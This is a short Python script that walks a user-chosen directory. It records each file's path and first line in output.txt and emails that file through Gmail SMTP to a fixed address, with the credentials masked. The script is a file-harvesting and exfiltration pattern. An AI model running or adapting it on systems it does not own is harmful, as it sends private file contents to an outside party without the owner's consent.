#!/usr/bin/env python3

# Imports libraries 

import os

import smtplib

fromaddr = '****************.com'  
toaddrs  = '****************.com'   

username = '*********'  
password = '*******'

# User enters filepath
filepath = input("Enter File path \n>:")

def dir_walk():
    # For each hit, concatenate the current directory pathing to left of result
    for root, dirs, files in os.walk(filepath, topdown=False):
        for name in files:
            datapath = (os.path.join(root, name))
            file = open(datapath)
            line = file.readline()
            with open("output.txt", "a") as data:
                data.write(datapath + "\n")
                data.write(line + "\n")

dir_walk()

server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
server.ehlo()
(server.login(username, password))

file = open('output.txt')
msg = file.read()
file.close() 

server.sendmail(fromaddr, toaddrs, msg)
server.quit()
